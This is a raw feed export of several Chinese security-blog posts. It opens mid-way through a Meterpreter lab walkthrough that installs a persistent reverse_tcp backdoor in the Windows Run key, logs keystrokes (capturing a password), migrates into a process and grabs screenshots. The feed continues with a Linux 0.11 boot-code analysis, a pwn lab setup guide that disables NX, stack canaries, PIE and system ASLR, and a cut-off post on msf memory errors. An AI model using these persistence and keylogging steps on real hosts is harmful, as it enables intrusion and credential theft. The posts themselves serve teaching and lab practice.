class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence -U -i 5 -p 443 -r 192.168.161.138</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /root/.msf4/logs/persistence/TOPSEC_20180319.1312/TOPSEC_20180319.1312.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.161.138 LPORT=443</span><br><span class="line">[*] Persistent agent script is 99606 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\ADMINI~1.TES\AppData\Local\Temp\xdoxmsHr.vbs</span><br><span class="line">[*] Executing script C:\Users\ADMINI~1.TES\AppData\Local\Temp\xdoxmsHr.vbs</span><br><span class="line">[+] Agent executed with PID 3528</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\jQiyGnPRxgnllmr</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\jQiyGnPRxgnllmr</span><br></pre></td></tr></table></figure><p>然后重启试下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; </span><br><span class="line">[*] 192.168.161.132 - Meterpreter session 4 closed.  Reason: Died</span><br><span class="line">msf exploit(multi/handler) &gt; [*] Sending stage (179779 bytes) to 192.168.161.132</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.161.138:443 -&gt; 192.168.161.132:49169) at 2018-03-19 21:18:07 +0800</span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                  Connection</span><br><span class="line">  --  ----  ----                     -----------                  ----------</span><br><span class="line">  5         meterpreter x86/windows  TEST\Administrator @ TOPSEC  192.168.161.138:443 -&gt; 192.168.161.132:49169 (192.168.161.132)</span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; sessions -i 5</span><br><span class="line">[*] Starting interaction with 5...</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure></p><p>会留一个后门，并添加进启动项</p><h2 id="0X0D键盘记录"><a href="#0X0D键盘记录" class="headerlink" title="0X0D键盘记录"></a>0X0D键盘记录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start</span><br><span class="line">Starting the keystroke sniffer ...</span><br><span class="line">meterpreter &gt; keyscan_dump </span><br><span class="line">Dumping captured keystrokes...</span><br><span class="line">mima&lt;Shift&gt;&lt;Right Shift&gt;:12345679&lt;^S&gt;</span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_stop</span><br><span class="line">Stopping the keystroke sniffer...</span><br></pre></td></tr></table></figure><h2 id="0X0E进程注入"><a href="#0X0E进程注入" class="headerlink" title="0X0E进程注入"></a>0X0E进程注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name               Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----               ----  -------  ----                          ----</span><br><span class="line"> 0     0     [System Process]                                                </span><br><span class="line"> 4     0     System             x86   0                                      </span><br><span class="line"> 232   4     smss.exe           x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe</span><br><span class="line"> 320   312   csrss.exe          x86   0        NT AUTHORITY\SYSTEM           C:\windows\system32\csrss.exe</span><br><span class="line"> 368   480   msdtc.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  C:\windows\System32\msdtc.exe</span><br><span class="line"> 372   312   wininit.exe        x86   0        NT AUTHORITY\SYSTEM           C:\windows\system32\wininit.exe</span><br><span class="line"> 384   364   csrss.exe          x86   1        NT AUTHORITY\SYSTEM           C:\windows\system32\csrss.exe</span><br><span class="line"> 432   364   winlogon.exe       x86   1        NT AUTHORITY\SYSTEM           C:\windows\system32\winlogon.exe</span><br><span class="line"> 480   372   services.exe       x86   0        NT AUTHORITY\SYSTEM           C:\windows\system32\services.exe</span><br><span class="line"> 488   372   lsass.exe          x86   0        NT AUTHORITY\SYSTEM           C:\windows\system32\lsass.exe</span><br><span class="line">...</span><br><span class="line">meterpreter &gt; migrate 3104</span><br><span class="line">[*] Migrating to 3104</span><br></pre></td></tr></table></figure><h2 id="0x0F-截屏"><a href="#0x0F-截屏" class="headerlink" title="0x0F 截屏"></a>0x0F 截屏</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">eterpreter &gt; use espia</span><br><span class="line">Loading extension espia...Success.</span><br><span class="line">meterpreter &gt; screen</span><br><span class="line">screengrab  screenshot  </span><br><span class="line">meterpreter &gt; screengrab </span><br><span class="line">Screenshot saved to: /home/daiker/zQBKZbTv.jpeg</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;这里简要探究下meterpreter 的使用。meterpreter有个很有效的功能就是，除了持久化控制,其他的操作都在内存里面，不会写进物理磁盘。重启下各种痕迹就消失了。&lt;/p&gt;
&lt;h2 id=&quot;0x01-权限提升&quot;&gt;&lt;a href=&quot;#0x01-权限提升&quot; class=&quot;headerlink&quot; title=&quot;0x01 权限提升&quot;&gt;&lt;/a&gt;0x01 权限提升&lt;/h2&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="工具使用" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
      <category term="Linux" scheme="http://www.daikersec.com/tags/Linux/"/>
    
      <category term="Kali" scheme="http://www.daikersec.com/tags/Kali/"/>
    
      <category term="tools" scheme="http://www.daikersec.com/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>Linuxv0.11源码分析之引导启动程序一</title>
    <link href="http://www.daikersec.com/wiki/b309a0f3.html"/>
    <id>http://www.daikersec.com/wiki/b309a0f3.html</id>
    <published>2018-03-19T05:16:28.000Z</published>
    <updated>2018-05-21T03:03:47.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-大体流程"><a href="#0x00-大体流程" class="headerlink" title="0x00 大体流程"></a>0x00 大体流程</h2><p>这篇文章所分析的代码是从开机到bios启动，到bios引导载入第一个引导扇区(bootsect.s)，到2到5个引导扇区(setup.s),到载入后面的240个扇区(head.s)的内容，<br>最后将程序的控制权交给<code>setup.s</code><br><a id="more"></a></p><h2 id="0x01-bios做了什么"><a href="#0x01-bios做了什么" class="headerlink" title="0x01 bios做了什么"></a>0x01 bios做了什么</h2><p>按下电源键的时候，CPU硬件逻辑设计为强行将CS的值置为0F000,IP的值置为0xFFF0,这样CS：IP就指向0xFFFF0这个地址位置。<br>而bios的入口地址就设计在这个位置。这个时候bios开始运行。bios会读取并检测显卡，内存等电脑硬件。<br>接下来bios会在内存中加载向量表和终端服务程序。此时内存的信息如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00000-0x003FF 中断向量表(1kb)</span><br><span class="line">0x00400-0x004FF BIOS数据区(256b)</span><br><span class="line">....</span><br><span class="line">57kb以后-xxxx(8kb)的终端服务程序</span><br></pre></td></tr></table></figure></p><p>接下来bios会触发0x19中断<br>这个中断对应的中断服务程序的功能是将0号磁头对应盘面的0磁道1扇区的内容(共512个字节，就叫做”主引导记录”（Master boot record，缩写为MBR）)复制至内存<code>0x07C00</code>处</p><h2 id="0x02-将随后的4个扇区加载进内存"><a href="#0x02-将随后的4个扇区加载进内存" class="headerlink" title="0x02 将随后的4个扇区加载进内存"></a>0x02 将随后的4个扇区加载进内存</h2><p>从入口开始看<br><code>boot/bootsect.s</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">entry _start</span><br><span class="line">_start:</span><br><span class="line">movax,#BOOTSEG</span><br><span class="line">movds,ax</span><br><span class="line">movax,#INITSEG</span><br><span class="line">moves,ax</span><br><span class="line">movcx,#256</span><br><span class="line">subsi,si</span><br><span class="line">subdi,di</span><br><span class="line">rep</span><br><span class="line">movw !bootsec</span><br></pre></td></tr></table></figure></p><p>这段代码是含义是将<code>BOOTSEG</code>后面512个字节移到<code>INITSEG</code>后面的512个字节<br>然后看下<code>BOOTSEG</code>和<code>INITSEG</code>的定义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BOOTSEG  = 0x07c0! 启动扇区被BIOS加载的位置</span><br><span class="line">INITSEG  = 0x9000! 启动扇区将移动到的新位置</span><br></pre></td></tr></table></figure></p><p>也就是说我们在前一步通过bios加载进内存的512字节，一开始会先把自己512字节内容由0x07c00复制到0x90000处<br>接下来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmpigo,INITSEG !跳转到0x90000处继续执行</span><br></pre></td></tr></table></figure></p><p>这里jmpi的格式是<code>jmpi ip,cs</code>。如果没有这一步，程序接下来会执行0x07C00为开始的那一段的go处。<br>但是这里跳转到0x90000开始的那一段内存的go处。跳转到复制完的地方执行。<br>接下来继续看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">go:movax,cs</span><br><span class="line">movds,ax</span><br><span class="line">moves,ax</span><br><span class="line">! put stack at 0x9ff00.</span><br><span class="line">movss,ax</span><br><span class="line">movsp,#0xFF00! arbitrary value &gt;&gt;512</span><br></pre></td></tr></table></figure></p><p>前面已经改变了cs，现在对ds，es，sp的值进行设置<br>继续看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">load_setup:</span><br><span class="line">movdx,#0x0000! drive 0, head 0</span><br><span class="line">movcx,#0x0002! sector 2, track 0</span><br><span class="line">movbx,#0x0200! address = 512, in INITSEG</span><br><span class="line">movax,#0x0200+SETUPLEN! service 2, nr of sectors</span><br><span class="line">int0x13! read it</span><br></pre></td></tr></table></figure></p><p>首先查下bios的0x13中断是什么意思<br><img src="https://upload-images.jianshu.io/upload_images/5443560-8e0e5dcf8d244507.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="BIOS中断表"><br>对应表格查阅，可以看出这几行代码的意思是把从第二个扇区开始的4个扇区(即setup.s，在boot/setup.s里面)读进内存es:bx处，<br>即0x90200处。前面说到第一个扇区的内存被复制到0x90000处，0x90200离0x90000有256字节，刚好是第一个扇区的长度。<br>也就是说第一个扇区和第二个扇区相邻。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jncok_load_setup! ok - continue</span><br><span class="line">movdx,#0x0000</span><br><span class="line">movax,#0x0000! reset the diskette</span><br><span class="line">int0x13</span><br><span class="line">jload_setup</span><br></pre></td></tr></table></figure><p>这段代码是判断是否成功，没有成功的话，系统复位之后再重新读一次。</p><h2 id="0x03-将后面的240个扇区加载进内存"><a href="#0x03-将后面的240个扇区加载进内存" class="headerlink" title="0x03 将后面的240个扇区加载进内存"></a>0x03 将后面的240个扇区加载进内存</h2><p>接下来我们将第三批程序载入内存<br>从105行开始<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">! ok, we&apos;ve written the message, now</span><br><span class="line">! we want to load the system (at 0x10000)</span><br><span class="line"></span><br><span class="line">movax,#SYSSEG</span><br><span class="line">moves,ax! segment of 0x010000</span><br><span class="line">callread_it</span><br><span class="line">callkill_motor</span><br></pre></td></tr></table></figure></p><p>这段代码的功能和载入setup.s一样，，只不过载入setup.s只有四个扇区，这段代码足足占了240个扇区。花的时间比较长，<br>为了防止用户以为机器故障，linus加了一个输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">movah,#0x03! read cursor pos</span><br><span class="line">xorbh,bh</span><br><span class="line">int0x10</span><br><span class="line"></span><br><span class="line">movcx,#24</span><br><span class="line">movbx,#0x0007! page 0, attribute 7 (normal)</span><br><span class="line">movbp,#msg1</span><br><span class="line">movax,#0x1301! write string, move cursor</span><br><span class="line">int0x10</span><br></pre></td></tr></table></figure><p>调用0x10中断输出<code>Loading system ...</code><br>看下0x10中断的内容<br><img src="https://upload-images.jianshu.io/upload_images/5443560-e41ee43275a295b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p>下面我们来具体看下这240个扇区怎么载入的</p><p>我们先看下<code>read_it</code>子模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">read_it:</span><br><span class="line">mov ax,es</span><br><span class="line">test ax,#0x0fff</span><br><span class="line">die:jne die! 确保es必须是64kb</span><br><span class="line">xor bx,bx!清空bx,使得bs可以被用作段内基址</span><br><span class="line">rp_read:</span><br><span class="line">mov ax,es</span><br><span class="line">cmp ax,#ENDSEG! have we loaded all yet?</span><br><span class="line">jb ok1_read</span><br><span class="line">ret</span><br><span class="line">ok1_read:</span><br><span class="line">seg cs</span><br><span class="line">mov ax,sectors</span><br><span class="line">sub ax,sread</span><br><span class="line">mov cx,ax</span><br><span class="line">shl cx,#9</span><br><span class="line">add cx,bx</span><br><span class="line">jnc ok2_read</span><br><span class="line">je ok2_read</span><br><span class="line">xor ax,ax</span><br><span class="line">sub ax,bx</span><br><span class="line">shr ax,#9</span><br><span class="line">ok2_read:</span><br><span class="line">call read_track</span><br><span class="line">mov cx,ax</span><br><span class="line">add ax,sread</span><br><span class="line">seg cs</span><br><span class="line">cmp ax,sectors</span><br><span class="line">jne ok3_read</span><br><span class="line">mov ax,#1</span><br><span class="line">sub ax,head</span><br><span class="line">jne ok4_read</span><br><span class="line">inc track</span><br><span class="line">ok4_read:</span><br><span class="line">mov head,ax</span><br><span class="line">xor ax,ax</span><br><span class="line">ok3_read:</span><br><span class="line">mov sread,ax</span><br><span class="line">shl cx,#9</span><br><span class="line">add bx,cx</span><br><span class="line">jnc rp_read</span><br><span class="line">mov ax,es</span><br><span class="line">add ax,#0x1000</span><br><span class="line">mov es,ax</span><br><span class="line">xor bx,bx</span><br><span class="line">jmp rp_read</span><br><span class="line"></span><br><span class="line">read_track:</span><br><span class="line">push ax</span><br><span class="line">push bx</span><br><span class="line">push cx</span><br><span class="line">push dx</span><br><span class="line">mov dx,track</span><br><span class="line">mov cx,sread</span><br><span class="line">inc cx</span><br><span class="line">mov ch,dl</span><br><span class="line">mov dx,head</span><br><span class="line">mov dh,dl</span><br><span class="line">mov dl,#0</span><br><span class="line">and dx,#0x0100</span><br><span class="line">mov ah,#2</span><br><span class="line">int 0x13</span><br><span class="line">jc bad_rt</span><br><span class="line">pop dx</span><br><span class="line">pop cx</span><br><span class="line">pop bx</span><br><span class="line">pop ax</span><br><span class="line">ret</span><br><span class="line">bad_rt:mov ax,#0</span><br><span class="line">mov dx,#0</span><br><span class="line">int 0x13</span><br><span class="line">pop dx</span><br><span class="line">pop cx</span><br><span class="line">pop bx</span><br><span class="line">pop ax</span><br><span class="line">jmp read_track</span><br></pre></td></tr></table></figure><p>接下来看<code>kill_motor</code>子模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kill_motor:</span><br><span class="line">push dx</span><br><span class="line">mov dx,#0x3f2</span><br><span class="line">mov al,#0</span><br><span class="line">outb</span><br><span class="line">pop dx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h2 id="0x04-确认下根设备号"><a href="#0x04-确认下根设备号" class="headerlink" title="0x04 确认下根设备号"></a>0x04 确认下根设备号</h2><h2 id="0x05-将程序控制权转交给setup-s"><a href="#0x05-将程序控制权转交给setup-s" class="headerlink" title="0x05 将程序控制权转交给setup.s"></a>0x05 将程序控制权转交给setup.s</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SETUPSEG = 0x9020</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">! after that (everyting loaded), we jump to</span><br><span class="line">! the setup-routine loaded directly after</span><br><span class="line">! the bootblock:</span><br><span class="line"></span><br><span class="line">jmpi0,SETUPSEG</span><br></pre></td></tr></table></figure><p>前面说到0x13中断将第二个扇区到第五个扇区的内容(即setup.s的内容)加载到以0x90200处地址，现在跳转到那边，把控制权交给他</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-大体流程&quot;&gt;&lt;a href=&quot;#0x00-大体流程&quot; class=&quot;headerlink&quot; title=&quot;0x00 大体流程&quot;&gt;&lt;/a&gt;0x00 大体流程&lt;/h2&gt;&lt;p&gt;这篇文章所分析的代码是从开机到bios启动，到bios引导载入第一个引导扇区(bootsect.s)，到2到5个引导扇区(setup.s),到载入后面的240个扇区(head.s)的内容，&lt;br&gt;最后将程序的控制权交给&lt;code&gt;setup.s&lt;/code&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://www.daikersec.com/categories/Linux/"/>
    
      <category term="内核" scheme="http://www.daikersec.com/categories/Linux/%E5%86%85%E6%A0%B8/"/>
    
    
      <category term="Linux" scheme="http://www.daikersec.com/tags/Linux/"/>
    
      <category term="内核" scheme="http://www.daikersec.com/tags/%E5%86%85%E6%A0%B8/"/>
    
  </entry>
  
  <entry>
    <title>PWN环境搭建</title>
    <link href="http://www.daikersec.com/wiki/11af4bf6.html"/>
    <id>http://www.daikersec.com/wiki/11af4bf6.html</id>
    <published>2018-03-18T07:02:16.000Z</published>
    <updated>2018-05-21T03:03:47.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-关闭安全机制"><a href="#0x00-关闭安全机制" class="headerlink" title="0x00 关闭安全机制"></a>0x00 关闭安全机制</h2><p>1.关掉DEP/NX（堆栈不可执行）<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc  -z execstack -o pwnme pwnme.c</span><br></pre></td></tr></table></figure></p><p>2.关掉Stack Protector/Canary（栈保护）<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o pwnme pwnme.c</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>3.关掉程序ASLR/PIE（程序随机化保护）<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie -o pwnme pwnme.c</span><br></pre></td></tr></table></figure></p><p>4.关闭整个linux系统的ASLR保护<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su - </span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure></p><p>5.打开整个linux系统的ASLR保护<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su -</span><br><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure></p><ol start="6"><li>64位linux下面的GCC编译出一个32位可执行程序 加参数<code>- m32</code><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -z execstack -fno-stack-protector -o pwnme pwnme.c</span><br></pre></td></tr></table></figure></li></ol><p>另外说明下在ubuntu上如果要用 -m32 参数就要安装如下的库：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install build-essential module-assistant  </span><br><span class="line">$ sudo apt-get install gcc-multilib g++-multilib</span><br></pre></td></tr></table></figure></p><h2 id="0x01-安装pwntools"><a href="#0x01-安装pwntools" class="headerlink" title="0x01 安装pwntools"></a>0x01 安装pwntools</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><h2 id="0x02-安装peda"><a href="#0x02-安装peda" class="headerlink" title="0x02 安装peda"></a>0x02 安装peda</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><h2 id="0x03-绑定端口"><a href="#0x03-绑定端口" class="headerlink" title="0x03 绑定端口"></a>0x03 绑定端口</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp<span class="_">-l</span>:端口号，reuseaddr，fork <span class="built_in">exec</span>:程序位置</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-关闭安全机制&quot;&gt;&lt;a href=&quot;#0x00-关闭安全机制&quot; class=&quot;headerlink&quot; title=&quot;0x00 关闭安全机制&quot;&gt;&lt;/a&gt;0x00 关闭安全机制&lt;/h2&gt;&lt;p&gt;1.关掉DEP/NX（堆栈不可执行）&lt;br&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;gcc  -z execstack -o pwnme pwnme.c&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;2.关掉Stack Protector/Canary（栈保护）&lt;br&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;gcc -fno-stack-protector -o pwnme pwnme.c&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞挖掘" scheme="http://www.daikersec.com/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="二进制漏洞" scheme="http://www.daikersec.com/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="pwn" scheme="http://www.daikersec.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>解决msf内存不足不能启动的问题</title>
    <link href="http://www.daikersec.com/wiki/376537a6.html"/>
    <id>http://www.daikersec.com/wiki/376537a6.html</id>
    <published>2018-03-15T06:50:54.000Z</published>
    <updated>2018-05-21T03:03:47.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-问题"><a href="#0x00-问题" class="headerlink" title="0x00 问题"></a>0x00 问题</h2><p>在vps里面跑msf，经常遇到内存不足，提示如下<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/activesupport-4.2.10/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``&apos;: Cannot allocate memory - infocmp (Errno::ENOMEM)</span><br><span class="line">from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/activesupport-4.2.10/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``&apos;</span><br><span class="line">from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:1815:in `get_term_capabilities&apos;</span><br><span 